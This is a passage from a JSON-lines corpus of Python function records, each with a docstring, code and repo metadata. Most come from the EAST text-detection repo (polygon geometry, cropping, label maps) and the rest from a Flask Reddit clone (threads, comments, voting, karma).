poly[0][0] += R * r[0] * np.sin(theta)\n    poly[0][1] += R * r[0] * np.cos(theta)\n    poly[3][0] -= R * r[3] * np.sin(theta)\n    poly[3][1] -= R * r[3] * np.cos(theta)\n    ## p1, p2\n    theta = np.arctan2((poly[2][0] - poly[1][0]), (poly[2][1] - poly[1][1]))\n    poly[1][0] += R * r[1] * np.sin(theta)\n    poly[1][1] += R * r[1] * np.cos(theta)\n    poly[2][0] -= R * r[2] * np.sin(theta)\n    poly[2][1] -= R * r[2] * np.cos(theta)\n    ## p0, p1\n    theta = np.arctan2((poly[1][1] - poly[0][1]), (poly[1][0] - poly[0][0]))\n    poly[0][0] += R * r[0] * np.cos(theta)\n    poly[0][1] += R * r[0] * np.sin(theta)\n    poly[1][0] -= R * r[1] * np.cos(theta)\n    poly[1][1] -= R * r[1] * np.sin(theta)\n    ## p2, p3\n    theta = np.arctan2((poly[2][1] - poly[3][1]), (poly[2][0] - poly[3][0]))\n    poly[3][0] += R * r[3] * np.cos(theta)\n    poly[3][1] += R * r[3] * np.sin(theta)\n    poly[2][0] -= R * r[2] * np.cos(theta)\n    poly[2][1] -= R * r[2] * np.sin(theta)\nreturn poly", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "\"\"\"\nfind top-left vertice and resort\n\"\"\"\n", "func_signal": "def choose_best_begin_point(pre_result):\n", "code": "final_result = []\nfor coordinate in pre_result:\n    x1 = coordinate[0][0]\n    y1 = coordinate[0][1]\n    x2 = coordinate[1][0]\n    y2 = coordinate[1][1]\n    x3 = coordinate[2][0]\n    y3 = coordinate[2][1]\n    x4 = coordinate[3][0]\n    y4 = coordinate[3][1]\n    xmin = min(x1, x2, x3, x4)\n    ymin = min(y1, y2, y3, y4)\n    xmax = max(x1, x2, x3, x4)\n    ymax = max(y1, y2, y3, y4)\n    combinate = [[[x1, y1], [x2, y2], [x3, y3], [x4, y4]],\n                 [[x2, y2], [x3, y3], [x4, y4], [x1, y1]], \n                 [[x3, y3], [x4, y4], [x1, y1], [x2, y2]], \n                 [[x4, y4], [x1, y1], [x2, y2], [x3, y3]]]\n    dst_coordinate = [[xmin, ymin], [xmax, ymin], [xmax, ymax], [xmin, ymax]]\n    force = 100000000.0\n    force_flag = 0\n    for i in range(4):\n        temp_force = calculate_distance(combinate[i][0], dst_coordinate[0]) + calculate_distance(combinate[i][1], dst_coordinate[1]) + calculate_distance(combinate[i][2], dst_coordinate[2]) + calculate_distance(combinate[i][3], dst_coordinate[3])\n        if temp_force < force:\n            force = temp_force\n            force_flag = i\n    #if force_flag != 0:\n    #    print(\"choose one direction!\")\n    final_result.append(combinate[force_flag])\n    \nreturn final_result", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "'''\nfind image files in test data path\n:return: list of files found\n'''\n", "func_signal": "def get_images_for_test():\n", "code": "files = []\nexts = ['jpg', 'png', 'jpeg', 'JPG']\nfor parent, dirnames, filenames in os.walk(test_data_path):\n    for filename in filenames:\n        for ext in exts:\n            if filename.endswith(ext):\n                files.append(os.path.join(parent, filename))\n                break\n\n# print('Find {} images'.format(len(files)))\nreturn files", "path": "eval.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "# get the verticle line from line across point\n", "func_signal": "def line_verticle(line, point):\n", "code": "if line[1] == 0:\n    verticle = [0, -1, point[1]]\nelse:\n    if line[0] == 0:\n        verticle = [1, 0, -point[0]]\n    else:\n        verticle = [-1./line[0], -1, point[1] - (-1/line[0] * point[0])]\nreturn verticle", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "# compute the distance from p3 to p1-p2\n", "func_signal": "def point_dist_to_line(p1, p2, p3):\n", "code": "distance = 0\ntry:\n    eps = 1e-5\n    distance = np.linalg.norm(np.cross(p2 - p1, p1 - p3)) /(np.linalg.norm(p2 - p1)+eps)\n\nexcept:\n    print('point dist to line raise Exception')\n\nreturn distance", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "'''\nfit a rectangle from a parallelogram\n:param poly:\n:return:\n'''\n", "func_signal": "def rectangle_from_parallelogram(poly):\n", "code": "p0, p1, p2, p3 = poly\nangle_p0 = np.arccos(np.dot(p1-p0, p3-p0)/(np.linalg.norm(p0-p1) * np.linalg.norm(p3-p0)))\nif angle_p0 < 0.5 * np.pi:\n    if np.linalg.norm(p0 - p1) > np.linalg.norm(p0-p3):\n        # p0 and p2\n        ## p0\n        p2p3 = fit_line([p2[0], p3[0]], [p2[1], p3[1]])\n        p2p3_verticle = line_verticle(p2p3, p0)\n\n        new_p3 = line_cross_point(p2p3, p2p3_verticle)\n        ## p2\n        p0p1 = fit_line([p0[0], p1[0]], [p0[1], p1[1]])\n        p0p1_verticle = line_verticle(p0p1, p2)\n\n        new_p1 = line_cross_point(p0p1, p0p1_verticle)\n        return np.array([p0, new_p1, p2, new_p3], dtype=np.float32)\n    else:\n        p1p2 = fit_line([p1[0], p2[0]], [p1[1], p2[1]])\n        p1p2_verticle = line_verticle(p1p2, p0)\n\n        new_p1 = line_cross_point(p1p2, p1p2_verticle)\n        p0p3 = fit_line([p0[0], p3[0]], [p0[1], p3[1]])\n        p0p3_verticle = line_verticle(p0p3, p2)\n\n        new_p3 = line_cross_point(p0p3, p0p3_verticle)\n        return np.array([p0, new_p1, p2, new_p3], dtype=np.float32)\nelse:\n    if np.linalg.norm(p0-p1) > np.linalg.norm(p0-p3):\n        # p1 and p3\n        ## p1\n        p2p3 = fit_line([p2[0], p3[0]], [p2[1], p3[1]])\n        p2p3_verticle = line_verticle(p2p3, p1)\n\n        new_p2 = line_cross_point(p2p3, p2p3_verticle)\n        ## p3\n        p0p1 = fit_line([p0[0], p1[0]], [p0[1], p1[1]])\n        p0p1_verticle = line_verticle(p0p1, p3)\n\n        new_p0 = line_cross_point(p0p1, p0p1_verticle)\n        return np.array([new_p0, p1, new_p2, p3], dtype=np.float32)\n    else:\n        p0p3 = fit_line([p0[0], p3[0]], [p0[1], p3[1]])\n        p0p3_verticle = line_verticle(p0p3, p1)\n\n        new_p0 = line_cross_point(p0p3, p0p3_verticle)\n        p1p2 = fit_line([p1[0], p2[0]], [p1[1], p2[1]])\n        p1p2_verticle = line_verticle(p1p2, p3)\n\n        new_p2 = line_cross_point(p1p2, p1p2_verticle)\n        return np.array([new_p0, p1, new_p2, p3], dtype=np.float32)", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "#xuan zhuan tu pian\n\n", "func_signal": "def rotate(box_List,image):\n", "code": "n=len(box_List)\nc=0;\nangle=0\nfor i in range(n):\n    box=box_List[i]\n    y1 = min(box[0][1], box[1][1], box[2][1], box[3][1])\n    y2 = max(box[0][1], box[1][1], box[2][1], box[3][1])\n    x1 = min(box[0][0], box[1][0], box[2][0], box[3][0])\n    x2 = max(box[0][0], box[1][0], box[2][0], box[3][0])\n    for j in range(4):\n        if(box[j][1]==y2):\n            k1=j\n    for j in range(4):\n        if(box[j][0]==x2 and j!=k1):\n            k2=j\n    c=(box[k1][0]-box[k2][0])*1.0/(box[k1][1]-box[k2][1])\n    if(c<0):\n        c=-c\n    if(c>1):\n        c=1.0/c\n    angle=math.atan(c)+angle\nangle=angle/n\n(h, w) = image.shape[:2]\ncenter = (w / 2, h / 2)\nscale=1\nM = cv2.getRotationMatrix2D(center,angle, scale)\nimage_new = cv2.warpAffine(image, M, (w, h))\nreturn image_new", "path": "eval.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "\"\"\"\nCV2 => PI => tensor\n\"\"\"\n#image = Image.fromarray(np.uint8(img))\n\n", "func_signal": "def transform_for_test():\n", "code": "transform_list = []\n\ntransform_list.append(transforms.ToTensor())\n\ntransform_list.append(transforms.Normalize(mean=(0.5,0.5,0.5),std=(0.5,0.5,0.5)))\n\ntransform = transforms.Compose(transform_list)\n\nreturn transform", "path": "eval.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "# sort the four coordinates of the polygon, points in poly should be sorted clockwise\n# First find the lowest point\n", "func_signal": "def sort_rectangle(poly):\n", "code": "p_lowest = np.argmax(poly[:, 1])\nif np.count_nonzero(poly[:, 1] == poly[p_lowest, 1]) == 2:\n    # \u5e95\u8fb9\u5e73\u884c\u4e8eX\u8f74, \u90a3\u4e48p0\u4e3a\u5de6\u4e0a\u89d2\n    p0_index = np.argmin(np.sum(poly, axis=1))\n    p1_index = (p0_index + 1) % 4\n    p2_index = (p0_index + 2) % 4\n    p3_index = (p0_index + 3) % 4\n    return poly[[p0_index, p1_index, p2_index, p3_index]], 0.\nelse:\n    # \u627e\u5230\u6700\u4f4e\u70b9\u53f3\u8fb9\u7684\u70b9\n    p_lowest_right = (p_lowest - 1) % 4\n    p_lowest_left = (p_lowest + 1) % 4\n    angle = np.arctan(-(poly[p_lowest][1] - poly[p_lowest_right][1])/(poly[p_lowest][0] - poly[p_lowest_right][0]))\n    # assert angle > 0\n    if angle <= 0:\n        print(angle, poly[p_lowest], poly[p_lowest_right])\n    if angle/np.pi * 180 > 45:\n        # \u8fd9\u4e2a\u70b9\u4e3ap2\n        p2_index = p_lowest\n        p1_index = (p2_index - 1) % 4\n        p0_index = (p2_index - 2) % 4\n        p3_index = (p2_index + 1) % 4\n        return poly[[p0_index, p1_index, p2_index, p3_index]], -(np.pi/2 - angle)\n    else:\n        # \u8fd9\u4e2a\u70b9\u4e3ap3\n        p3_index = p_lowest\n        p0_index = (p3_index + 1) % 4\n        p1_index = (p3_index + 2) % 4\n        p2_index = (p3_index + 3) % 4\n        return poly[[p0_index, p1_index, p2_index, p3_index]], angle", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "'''\ncompute area of a polygon\n:param poly:\n:return:\n'''\n", "func_signal": "def polygon_area(poly):\n", "code": "poly_ = np.array(poly)\nassert poly_.shape == (4,2), 'poly shape should be 4,2'\nedge = [\n    (poly[1][0] - poly[0][0]) * (poly[1][1] + poly[0][1]),\n    (poly[2][0] - poly[1][0]) * (poly[2][1] + poly[1][1]),\n    (poly[3][0] - poly[2][0]) * (poly[3][1] + poly[2][1]),\n    (poly[0][0] - poly[3][0]) * (poly[0][1] + poly[3][1])\n]\nreturn np.sum(edge)/2.", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "'''\nmake random crop from the input image\n:param im:\n:param polys:\n:param tags:\n:param crop_background:\n:param max_tries:\n:return:\n'''\n", "func_signal": "def crop_area(im, polys, tags, crop_background=False, max_tries=50, vis = True, img_name = None):\n", "code": "print('goggogoogo')\nh, w, _ = im.shape\npad_h = h//10\npad_w = w//10\nh_array = np.zeros((h + pad_h*2), dtype=np.int32)\nw_array = np.zeros((w + pad_w*2), dtype=np.int32)\nfor poly in polys:\n    poly = np.round(poly, decimals=0).astype(np.int32)\n    minx = np.min(poly[:, 0])\n    maxx = np.max(poly[:, 0])\n    w_array[minx+pad_w:maxx+pad_w] = 1\n    miny = np.min(poly[:, 1])\n    maxy = np.max(poly[:, 1])\n    h_array[miny+pad_h:maxy+pad_h] = 1\n# ensure the cropped area not across a text\nh_axis = np.where(h_array == 0)[0]\nw_axis = np.where(w_array == 0)[0]\nprint('aaaaaaaaa')\nif len(h_axis) == 0 or len(w_axis) == 0:\n    return im, polys, tags\n\nprint('bbbbbbbbb')\nfor i in range(max_tries):\n    print('we have try {} times'.format(i))\n    xx = np.random.choice(w_axis, size=2)\n    xmin = np.min(xx) - pad_w\n    xmax = np.max(xx) - pad_w\n    xmin = np.clip(xmin, 0, w-1)\n    xmax = np.clip(xmax, 0, w-1)\n    yy = np.random.choice(h_axis, size=2)\n    ymin = np.min(yy) - pad_h\n    ymax = np.max(yy) - pad_h\n    ymin = np.clip(ymin, 0, h-1)\n    ymax = np.clip(ymax, 0, h-1)\n    # if xmax - xmin < FLAGS.min_crop_side_ratio*w or ymax - ymin < FLAGS.min_crop_side_ratio*h:\n    if xmax - xmin < 0.1*w or ymax - ymin < 0.1*h:\n        # area too small\n        continue\n    if polys.shape[0] != 0:\n        poly_axis_in_area = (polys[:, :, 0] >= xmin) & (polys[:, :, 0] <= xmax) \\\n                            & (polys[:, :, 1] >= ymin) & (polys[:, :, 1] <= ymax)\n        selected_polys = np.where(np.sum(poly_axis_in_area, axis=1) == 4)[0]\n    else:\n        selected_polys = []\n    if len(selected_polys) == 0:\n        # no text in this area\n        if crop_background:\n            im = im[ymin:ymax+1, xmin:xmax+1, :]\n            polys = polys[selected_polys]\n            tags = tags[selected_polys]\n            if vis == True:\n                path = os.path.join(os.path.abspath('./'), 'tmp/vis_for_crop', '{}-bg.jpg'.format(img_name))\n                cv2.imwrite(path, im)\n                print('save a bg')\n            return im, polys, tags\n        else:\n            continue\n    im = im[ymin:ymax+1, xmin:xmax+1, :]\n    polys = polys[selected_polys]\n    tags = tags[selected_polys]\n    polys[:, :, 0] -= xmin\n    polys[:, :, 1] -= ymin\n\n    print('crop front')\n    if vis == True:\n        #print('TEST for visualization about crop img')\n        for ids, poly in enumerate(polys):\n            print('img h:{} w:{} poly id:{} {}'.format(im.shape[0], im.shape[1], ids, poly))\n            x = [poly.astype(np.int32).reshape((-1, 1, 2))]\n            cv2.polylines(im[:, :, ::-1], x, True, color=(255, 255, 0), thickness=3)\n            print(x)\n        path = os.path.join(os.path.abspath('./'), 'tmp/vis_for_crop', '{}-fg.jpg'.format(img_name))\n        cv2.imwrite(path, im)\n        print('save a fg')\n    return im, polys, tags\n\nreturn im, polys, tags", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "\"\"\"\nscore map is (128, 128, 1) with shrinked poly\npoly mask is (128, 128, 1) with differnt colors\n\n\ngeo map is  (128, 128, 5) with\n\"\"\"\n", "func_signal": "def generate_rbox(im_size, polys, tags):\n", "code": "h, w = im_size\npoly_mask = np.zeros((h, w), dtype=np.uint8)\nscore_map = np.zeros((h, w), dtype=np.uint8)\ngeo_map = np.zeros((h, w, 5), dtype=np.float32)\n# mask used during traning, to ignore some hard areas\ntraining_mask = np.ones((h, w), dtype=np.uint8)\nfor poly_idx, poly_tag in enumerate(zip(polys, tags)):\n    poly = poly_tag[0]\n    tag = poly_tag[1]\n    poly = np.array(poly)\n    tag  = np.array(tag)\n    r = [None, None, None, None]\n    for i in range(4):\n        r[i] = min(np.linalg.norm(poly[i] - poly[(i + 1) % 4]),\n                   np.linalg.norm(poly[i] - poly[(i - 1) % 4]))\n    # score map\n    shrinked_poly = shrink_poly(poly.copy(), r).astype(np.int32)[np.newaxis, :, :]\n    cv2.fillPoly(score_map, shrinked_poly, 1)\n\n    # use different color to draw poly mask\n    cv2.fillPoly(poly_mask, shrinked_poly, poly_idx + 1)\n    # if the poly is too small, then ignore it during training\n    poly_h = min(np.linalg.norm(poly[0] - poly[3]), np.linalg.norm(poly[1] - poly[2]))\n    poly_w = min(np.linalg.norm(poly[0] - poly[1]), np.linalg.norm(poly[2] - poly[3]))\n    # if min(poly_h, poly_w) < FLAGS.min_text_size:\n    if min(poly_h, poly_w) < 10:\n        cv2.fillPoly(training_mask, poly.astype(np.int32)[np.newaxis, :, :], 0)\n    if tag:\n        cv2.fillPoly(training_mask, poly.astype(np.int32)[np.newaxis, :, :], 0)\n\n    xy_in_poly = np.argwhere(poly_mask == (poly_idx + 1))\n    # if geometry == 'RBOX':\n    # \u5bf9\u4efb\u610f\u4e24\u4e2a\u9876\u70b9\u7684\u7ec4\u5408\u751f\u6210\u4e00\u4e2a\u5e73\u884c\u56db\u8fb9\u5f62\n    fitted_parallelograms = []\n    for i in range(4):\n        p0 = poly[i]\n        p1 = poly[(i + 1) % 4]\n        p2 = poly[(i + 2) % 4]\n        p3 = poly[(i + 3) % 4]\n\n        #fit_line ([x1, x2], [y1, y2]) return k, -1, b just a line\n        edge = fit_line([p0[0], p1[0]], [p0[1], p1[1]])             #p0, p1\n        backward_edge = fit_line([p0[0], p3[0]], [p0[1], p3[1]])    #p0, p3\n        forward_edge = fit_line([p1[0], p2[0]], [p1[1], p2[1]])     #p1, p2\n\n        #select shorter line\n        if point_dist_to_line(p0, p1, p2) > point_dist_to_line(p0, p1, p3):\n            # \u5e73\u884c\u7ebf\u7ecf\u8fc7p2\n            if edge[1] == 0:#verticle\n                edge_opposite = [1, 0, -p2[0]]\n            else:\n                edge_opposite = [edge[0], -1, p2[1] - edge[0] * p2[0]]\n        else:\n            # \u7ecf\u8fc7p3\n            if edge[1] == 0:\n                edge_opposite = [1, 0, -p3[0]]\n            else:\n                edge_opposite = [edge[0], -1, p3[1] - edge[0] * p3[0]]\n        # move forward edge\n        new_p0 = p0\n        new_p1 = p1\n        new_p2 = p2\n        new_p3 = p3\n        new_p2 = line_cross_point(forward_edge, edge_opposite)\n        if point_dist_to_line(p1, new_p2, p0) > point_dist_to_line(p1, new_p2, p3):\n            # across p0\n            if forward_edge[1] == 0:\n                forward_opposite = [1, 0, -p0[0]]\n            else:\n                forward_opposite = [forward_edge[0], -1, p0[1] - forward_edge[0] * p0[0]]\n        else:\n            # across p3\n            if forward_edge[1] == 0:\n                forward_opposite = [1, 0, -p3[0]]\n            else:\n                forward_opposite = [forward_edge[0], -1, p3[1] - forward_edge[0] * p3[0]]\n        new_p0 = line_cross_point(forward_opposite, edge)\n        new_p3 = line_cross_point(forward_opposite, edge_opposite)\n        fitted_parallelograms.append([new_p0, new_p1, new_p2, new_p3, new_p0])\n        # or move backward edge\n        new_p0 = p0\n        new_p1 = p1\n        new_p2 = p2\n        new_p3 = p3\n        new_p3 = line_cross_point(backward_edge, edge_opposite)\n        if point_dist_to_line(p0, p3, p1) > point_dist_to_line(p0, p3, p2):\n            # across p1\n            if backward_edge[1] == 0:\n                backward_opposite = [1, 0, -p1[0]]\n            else:\n                backward_opposite = [backward_edge[0], -1, p1[1] - backward_edge[0] * p1[0]]\n        else:\n            # across p2\n            if backward_edge[1] == 0:\n                backward_opposite = [1, 0, -p2[0]]\n            else:\n                backward_opposite = [backward_edge[0], -1, p2[1] - backward_edge[0] * p2[0]]\n        new_p1 = line_cross_point(backward_opposite, edge)\n        new_p2 = line_cross_point(backward_opposite, edge_opposite)\n        fitted_parallelograms.append([new_p0, new_p1, new_p2, new_p3, new_p0])\n\n    areas = [Polygon(t).area for t in fitted_parallelograms]\n    parallelogram = np.array(fitted_parallelograms[np.argmin(areas)][:-1], dtype=np.float32)\n    # sort thie polygon\n    parallelogram_coord_sum = np.sum(parallelogram, axis=1)\n    min_coord_idx = np.argmin(parallelogram_coord_sum)\n    parallelogram = parallelogram[[min_coord_idx, (min_coord_idx + 1) % 4, (min_coord_idx + 2) % 4, (min_coord_idx + 3) % 4]]\n\n    rectange = rectangle_from_parallelogram(parallelogram)\n    rectange, rotate_angle = sort_rectangle(rectange)\n    #print('parallel {} rectangle {}'.format(parallelogram, rectange))\n    p0_rect, p1_rect, p2_rect, p3_rect = rectange\n    # this is one area of many\n    \"\"\"\n    for y, x in xy_in_poly:\n        point = np.array([x, y], dtype=np.float32)\n        # top\n        geo_map[y, x, 0] = point_dist_to_line(p0_rect, p1_rect, point)\n        # right\n        geo_map[y, x, 1] = point_dist_to_line(p1_rect, p2_rect, point)\n        # down\n        geo_map[y, x, 2] = point_dist_to_line(p2_rect, p3_rect, point)\n        # left\n        geo_map[y, x, 3] = point_dist_to_line(p3_rect, p0_rect, point)\n        # angle\n        geo_map[y, x, 4] = rotate_angle\n    \"\"\"\n    gen_geo_map.gen_geo_map(geo_map, xy_in_poly, rectange, rotate_angle)\n\n###sum up\n# score_map , in shrinked poly is 1\n# geo_map, corresponding to score map\n# training map is less than geo_map\n\nreturn score_map, geo_map, training_mask", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "#transform = transform_for_train()\n", "func_signal": "def __getitem__(self, index):\n", "code": "status = True\nwhile status:\n    img, score_map, geo_map, training_mask = image_label(self.txt_root,\n    \n        self.img_path_list, self.img_name_list,\n    \n        self.txt_path_list, self.txt_name_list,\n    \n        index, input_size = 512,\n    \n        random_scale = np.array([0.5, 1.0, 2.0, 3.0]), background_ratio = 3./8)\n\n    if not img is None:#512,512,3 ndarray should transform to 3,512,512\n\n\n        status = False\n        \n        #img = transform_for_train(img)\n        img = img.transpose(2, 0, 1)\n        #print(img.shape)\n        #print(type(img))\n\n        return img, score_map, geo_map, training_mask\n\n    else:\n\n        index = np.random.random_integers(0, self.__len__())\n        print('Exception in getitem, and choose another index:{}'.format(index))\n\n\n\n\n#    sys.exit('some image cant find approprite crop')\n#img = transform_for_train(img)\n#if img == None:\n#   return None, None, None, None", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "# fit a line ax+by+c = 0\n", "func_signal": "def fit_line(p1, p2):\n", "code": "if p1[0] == p1[1]:\n    return [1., 0., -p1[0]]\nelse:\n    [k, b] = np.polyfit(p1, p2, deg=1)\n    return [k, -1., b]", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "'''\nload annotation from the text file\n\nNote:\nmodified\n1. top left vertice\n2. clockwise\n\n:param p:\n:return:\n'''\n", "func_signal": "def load_annoataion(p):\n", "code": "text_polys = []\ntext_tags = []\nif not os.path.exists(p):\n    return np.array(text_polys, dtype=np.float32)\nwith open(p, 'r') as f:\n    reader = csv.reader(f)\n    for line in reader: \n        label = line[-1]# strip BOM. \\ufeff for python3,  \\xef\\xbb\\bf for python2 \n        line = [i.strip('\\ufeff').strip('\\xef\\xbb\\xbf') for i in line] \n        x1, y1, x2, y2, x3, y3, x4, y4 = list(map(int, line[:8])) \n        text_polys.append([[x1, y1], [x2, y2], [x3, y3], [x4, y4]])\n        if label == '*' or label == '###':\n            text_tags.append(True)\n        else:\n            text_tags.append(False)\n    \nreturn np.array(text_polys, dtype=np.float32), np.array(text_tags, dtype=np.bool)\n#return text_polys, text_tags", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "\"\"\"\nadd a comment to this particular thread\n\"\"\"\n", "func_signal": "def add_comment(self, comment_text, comment_parent_id, user_id):\n", "code": "if len(comment_parent_id) > 0:\n    # parent_comment = Comment.query.get_or_404(comment_parent_id)\n    # if parent_comment.depth + 1 > THREAD.MAX_COMMENT_DEPTH:\n    #    flash('You have exceeded the maximum comment depth')\n    comment_parent_id = int(comment_parent_id)\n    comment = Comment(thread_id=self.id, user_id=user_id,\n            text=comment_text, parent_id=comment_parent_id)\nelse:\n    comment = Comment(thread_id=self.id, user_id=user_id,\n            text=comment_text)\n\ndb.session.add(comment)\ndb.session.commit()\ncomment.set_depth()\nreturn comment", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nreturns the reddit hotness algorithm (votes/(age^1.5))\n\"\"\"\n", "func_signal": "def get_hotness(self):\n", "code": "order = log(max(abs(self.votes), 1), 10) # Max/abs are not needed in our case\nseconds = self.get_age() - 1134028003\nreturn round(order + seconds / 45000, 6)", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nreturns the reddit hotness algorithm (votes/(age^1.5))\n\"\"\"\n", "func_signal": "def set_hotness(self):\n", "code": "self.hotness = self.get_hotness()\ndb.session.commit()", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nfetch the number of votes this user has had on his/her threads\n\n1.) Get id's of all threads by this user\n\n2.) See how many of those threads also were upvoted but not by\nthe person him/her self.\n\"\"\"\n", "func_signal": "def get_thread_karma(self):\n", "code": "thread_ids = [t.id for t in self.threads]\nselect = thread_upvotes.select(db.and_(\n        thread_upvotes.c.thread_id.in_(thread_ids),\n        thread_upvotes.c.user_id != self.id\n    )\n)\nrs = db.engine.execute(select)\nreturn rs.rowcount", "path": "flask_reddit\\users\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nSubmit votes via ajax\n\"\"\"\n", "func_signal": "def vote_comment():\n", "code": "comment_id = int(request.form['comment_id'])\nuser_id = g.user.id\n\nif not comment_id:\n    abort(404)\n\ncomment = Comment.query.get_or_404(int(comment_id))\ncomment.vote(user_id=user_id)\nreturn jsonify(new_votes=comment.get_votes())", "path": "flask_reddit\\apis\\views.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nfetch the number of votes this user has had on his/her comments\n\"\"\"\n", "func_signal": "def get_comment_karma(self):\n", "code": "comment_ids = [c.id for c in self.comments]\nselect = comment_upvotes.select(db.and_(\n        comment_upvotes.c.comment_id.in_(comment_ids),\n        comment_upvotes.c.user_id != self.id\n    )\n)\nrs = db.engine.execute(select)\nreturn rs.rowcount", "path": "flask_reddit\\users\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nSubmit votes via ajax\n\"\"\"\n", "func_signal": "def vote_thread():\n", "code": "thread_id = int(request.form['thread_id'])\nuser_id = g.user.id\n\nif not thread_id:\n    abort(404)\n\nthread = Thread.query.get_or_404(int(thread_id))\nvote_status = thread.vote(user_id=user_id)\nreturn jsonify(new_votes=thread.votes, vote_status=vote_status)", "path": "flask_reddit\\apis\\views.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nideally this type of heavy content fetching should be put on a\ncelery background task manager or at least a crontab.. instead of\nsetting it to run literally as someone posts a thread. but once again,\nthis repo is just a simple example of a reddit-like crud application!\n\"\"\"\n", "func_signal": "def extract_thumbnail(self):\n", "code": "DEFAULT_THUMBNAIL = 'https://reddit.codelucas.com/static/imgs/reddit-camera.png'\nif self.link:\n    thumbnail = media.get_top_img(self.link)\nif not thumbnail:\n    thumbnail = DEFAULT_THUMBNAIL\nself.thumbnail = thumbnail\ndb.session.commit()", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\ncall after initializing\n\"\"\"\n", "func_signal": "def set_depth(self):\n", "code": "if self.parent:\n    self.depth = self.parent.depth + 1\n    db.session.commit()", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nnested comments are pushed right on a page\n-15px is our default margin for top level comments\n\"\"\"\n", "func_signal": "def get_margin_left(self):\n", "code": "margin_left = 15 + ((self.depth-1) * 32)\nmargin_left = min(margin_left, 680)\nreturn str(margin_left) + \"px\"", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nreturns a humanized version of the raw age of this thread,\neg: 34 minutes ago versus 2040 seconds ago.\n\"\"\"\n", "func_signal": "def pretty_date(self, typeof='created'):\n", "code": "if typeof == 'created':\n    return utils.pretty_date(self.created_on)\nelif typeof == 'updated':\n    return utils.pretty_date(self.updated_on)", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nallow a user to vote on a thread. if we have voted already\n(and they are clicking again), this means that they are trying\nto unvote the thread, return status of the vote for that user\n\"\"\"\n", "func_signal": "def vote(self, user_id):\n", "code": "already_voted = self.has_voted(user_id)\nvote_status = None\nif not already_voted:\n    # vote up the thread\n    db.engine.execute(\n        thread_upvotes.insert(),\n        user_id   = user_id,\n        thread_id = self.id\n    )\n    self.votes = self.votes + 1\n    vote_status = True\nelse:\n    # unvote the thread\n    db.engine.execute(\n        thread_upvotes.delete(\n            db.and_(\n                thread_upvotes.c.user_id == user_id,\n                thread_upvotes.c.thread_id == self.id\n            )\n        )\n    )\n    self.votes = self.votes - 1\n    vote_status = False\ndb.session.commit() # for the vote count\nreturn vote_status", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\ndefault order by timestamp\n\"\"\"\n", "func_signal": "def get_comments(self, order_by='timestamp'):\n", "code": "if order_by == 'timestamp':\n    return self.children.order_by(db.desc(Comment.created_on)).\\\n        all()[:THREAD.MAX_COMMENTS]\nelse:\n    return self.comments.order_by(db.desc(Comment.created_on)).\\\n        all()[:THREAD.MAX_COMMENTS]", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
